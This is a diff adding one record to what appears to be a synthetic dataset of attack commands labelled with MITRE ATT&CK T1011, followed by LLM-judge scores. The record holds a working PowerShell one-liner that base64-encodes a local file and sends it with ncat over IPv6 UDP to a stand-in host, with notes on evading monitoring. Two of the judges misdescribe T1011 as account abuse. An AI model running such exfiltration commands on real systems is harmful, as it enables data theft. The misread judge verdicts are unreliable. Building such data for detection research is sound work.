@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u --source-port 60999 2001:db8:dead:beef::24 57777 --send-only",
+  "explanation": "Exfiltrates over IPv6 UDP using an uncommon fixed source and destination port to avoid typical monitored services. This leverages an alternative medium/protocol from usual C2 channels, consistent with T1011.",
+  "rationale_steps": [
+    "Base64-encode content to blend payload bytes.",
+    "Send via IPv6 UDP with unusual source/destination ports to separate from common traffic."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-40a7ef4f",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax for base64 conversion, and correct ncat parameter flags.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements exfiltration over an alternative channel (IPv6 UDP) with specific ports as claimed, but there's a mismatch between the claimed MITRE technique T1011 (Exfiltration Over Other Network Medium) and the command explanation which mentions 'Establish Accounts'.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T09:34:08.880395Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell variable assignment, .NET method calls, command separator, pipeline, and `ncat.exe` arguments are all perfectly well-formed and syntactically correct.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration, which is completely unrelated to establishing or abusing accounts as defined by the T1011 technique.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T09:34:12.678840Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting and a valid pipeline to ncat.exe, using correctly formatted ncat flags and arguments.",
+        "semantic_score": 4,
+        "semantic_justification": "It reads the file, base64-encodes it, and sends it via IPv6 UDP with specified ports using ncat as claimed, though PowerShell may pipe text to native stdin in UTF-16/UTF-8 which can affect downstream decoding.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T09:34:59.743384Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
